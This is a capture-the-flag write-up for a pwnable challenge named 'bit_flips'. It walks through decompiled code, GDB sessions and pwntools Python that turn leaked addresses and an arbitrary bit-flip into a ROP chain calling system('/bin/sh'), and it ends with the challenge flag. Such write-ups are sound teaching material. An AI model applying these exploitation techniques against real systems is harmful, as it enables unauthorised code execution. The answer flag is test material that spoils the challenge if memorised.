# bit_flips

## 1. Summary

- **Category**: Pwnable
- **Points (Solved Only)**: 250
- **Solves (Solved Only)**: 129

### Description

> `can you do it in just 3 bit flips?`

## 2. Analysis

### Checksec (Pwnable Only)

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### Vulnerability

- **Information Leak**: The `vuln` function leaks stack, heap, code, and libc addresses.

```c
  printf("&main = %p\n",main);
  printf("&system = %p\n",system);
  printf("&address = %p\n",&local_18);
  pvVar1 = sbrk(0);
  printf("sbrk(NULL) = %p\n",pvVar1);
  for (local_1c = 0; local_1c < 3; local_1c = local_1c + 1) {
    bit_flip();
  }
```

- **Arbitrary Bit Flip**: The `bit_flip` function takes an arbitrary address and a bit index from the user to flip a bit at that location. Since the stack address is known, it is possible to manipulate the `local_1c` loop counter to increase the number of available flips.

```c
  __isoc23_scanf("%llx",&local_18);
  __isoc23_scanf("%d",&local_1c);
  if ((local_1c < 8) && (-1 < local_1c)) {
    *local_18 = *local_18 ^ 1 << (local_1c & 0x1f);
  }
```

- **Hidden Function**: Decompilation reveals a `cmd` function that cannot be reached through normal execution flow. This function reads from a file pointer `f` and passes the content to `system()`. The pointer `f` is initialized in `setup` via `f = fopen("./commands","r");`.

```c
  do {
    pcVar3 = fgets(local_28,0x18,f);
    sVar2 = strcspn(local_28,"\n");
    local_28[sVar2] = '\0';
  } while ((local_28[0] == '\0') || (iVar1 = system(local_28), iVar1 != -1));
```

## 3. Exploit Flow

1. **Initial Attempt: Redirecting to `cmd`**
   Comparing the return address (`main+29`) with the address of `cmd`, I found they differ by exactly 3 bits.

   ```text
   gef➤  x/2gx $rbp
   0x7fffffffe2f0: 0x00007fffffffe300      0x0000555555555422
   gef➤  x/gx 0x0000555555555422
   0x555555555422 <main+29>:       0x55c35d00000000b8
   gef➤  x/gx cmd
   0x555555555429 <cmd>:   0x30ec8348e5894855
   gef➤  pi bin(0x0000555555555422^0x555555555429)
   '0b1011'
   ```

   While `system: Success` was printed, the execution did not proceed further.

2. **Loop Counter Extension**
   As originally planned, I switched to a method where I manipulated the loop counter to a negative value to allow for a larger payload, then restored it later.

   ```python
   xor(r, stack_counter + 3, 0, 0x80)
   ```

3. **Memory Structure and RBP Analysis**
   At the return point of `vuln`, the lower 12 bits of `rbp` are `0x280`, which matches the initial leaked `&address + 0x20`.

   ```text
   &address = 0x7fffffffe260
   gef➤  x/2gx $rbp
   0x7fffffffe270: 0x00007fffffffe280      0x000015555550f422
   ```

   The `system` argument at `[RBP - 0x20]` would reference `&address`. I initially tried flipping bits there to make it `/bin/sh`, but the stack values changed during the `system` call.

   ```text
   gef➤  x/i $rip
   => 0x155555356750 <system>:     endbr64
   gef➤  x/s $rdi
   0x7fffffffe310: "/bin/sh"

   gef➤  x/i $rip
   => 0x155555356440:      call   0x15555540ccd0 <posix_spawn>
   gef➤  x/gx 0x7fffffffe310
   0x7fffffffe310: 0x00007fffffffe330

   sh: 1: 0\xe3\xff\xff\xff\x7f: not found
   ```

4. **ROP Construction**
   I decided to use a `pop rdi` gadget to point to the `/bin/sh` string inside `libc`, which remains stable. To handle the `SIGSEGV` caused by the `movaps` instruction (stack alignment), I added a `ret` gadget.

   ```python
    binsh = next(libc.search(b"/bin/sh\0"))
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [binsh])
    payload = rop.chain()
   ```

5. **Restoration and Execution**
   I stored the original stack values in `stack_org` to XOR them with the target payload, then applied the bit flips. Finally, restoring the loop counter triggers the return and executes the shell.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

```python
    binsh = next(libc.search(b"/bin/sh\0"))
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [binsh])
    payload = rop.chain()
    stack_org = [
        elf.sym.main + 0x1D,
        stack_addr + 0xC0,
        libc.libc_start_main_return,
        stack_addr + 0x70,
    ]

    for i in range(0, len(payload), 8):
        xor(
            r,
            stack_ret + i,
            stack_org[i // 8],
            u64(payload[i : i + 8].ljust(8, b"\0")),
        )
        
    # Restore the loop counter to exit the loop and trigger ROP
    xor(r, stack_counter + 3, 0, 0x80)
```

## 5. Flag

`0xfun{3_b1t5_15_4ll_17_74k35_70_g37_RC3_safhu8}`
